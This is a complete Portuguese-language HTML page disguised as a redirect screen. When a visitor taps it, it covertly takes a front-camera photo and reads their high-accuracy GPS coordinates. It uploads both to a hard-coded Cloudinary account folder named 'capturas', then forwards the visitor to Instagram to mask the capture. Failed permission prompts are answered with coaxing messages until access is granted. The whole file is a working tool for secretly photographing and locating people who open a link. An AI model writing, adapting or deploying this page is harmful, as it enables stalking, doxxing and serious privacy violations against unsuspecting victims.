<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Redirecionando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin:0; overflow:hidden; background:#000; }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex; justify-content: center; align-items: center;
      color: #fff; font-family: sans-serif; font-size: 20px;
      background: rgba(0, 0, 0, 0.8);
      z-index: 9999;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para continuar...</div>
  <script>
    const cloudName = "dx5legahb";
    const uploadPreset = "upload";
    const folderName = "capturas";

    async function capturarTudo() {
      try {
        // Remove o overlay de instrução se visível
        const overlay = document.getElementById("overlay");
        overlay.style.display = "none";

        // 1️⃣ Captura a imagem usando a câmera frontal
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });
        const video = document.createElement("video");
        video.playsInline = true; // essencial para iOS
        video.muted = true;       // essencial para autoplay no iOS
        video.srcObject = stream;
        await video.play();

        // Aguarda um instante para garantir renderização (300ms)
        await new Promise(r => setTimeout(r, 300));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(track => track.stop());

        const imageData = canvas.toDataURL("image/png");
        const imageBlob = await (await fetch(imageData)).blob();

        const imageForm = new FormData();
        imageForm.append("file", imageBlob);
        imageForm.append("upload_preset", uploadPreset);
        imageForm.append("folder", folderName);

        const imageResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
          method: "POST",
          body: imageForm
        });
        if (!imageResp.ok) throw new Error("Erro ao enviar imagem");
        const imageUrl = (await imageResp.json()).secure_url;

        // 2️⃣ Captura a localização com alta precisão
        navigator.geolocation.getCurrentPosition(async (pos) => {
          const { latitude, longitude } = pos.coords;
          const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
          const textBlob = new Blob([texto], { type: "text/plain" });

          const textForm = new FormData();
          textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
          textForm.append("upload_preset", uploadPreset);
          textForm.append("folder", folderName);

          const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
            method: "POST",
            body: textForm
          });
          if (!textResp.ok) throw new Error("Erro ao enviar arquivo de localização");

          // Redireciona para o Instagram se tudo ocorrer bem
          window.location.href = "https://instagram.com";
        }, (err) => {
          console.error("Erro ao obter localização:", err);
          mostrarOverlay("Permita a localização para continuar. Toque para tentar novamente.");
        }, {
          enableHighAccuracy: true,
          timeout: 8000,
          maximumAge: 0
        });

      } catch (error) {
        console.error("Erro:", error);
        mostrarOverlay("Permita o acesso à câmera e localização para continuar. Toque para tentar novamente.");
      }
    }

    // Função para exibir o overlay com uma mensagem e permitir reiniciar o fluxo
    function mostrarOverlay(mensagem) {
      const overlay = document.getElementById("overlay");
      overlay.style.display = "flex";
      overlay.textContent = mensagem;
      overlay.onclick = () => {
        overlay.textContent = "Toque para continuar...";
        capturarTudo();
      };
    }

    // Inicia o fluxo apenas após o usuário tocar na tela
    document.body.addEventListener("click", function handler() {
      document.body.removeEventListener("click", handler);
      capturarTudo();
    });
  </script>
</body>
</html>
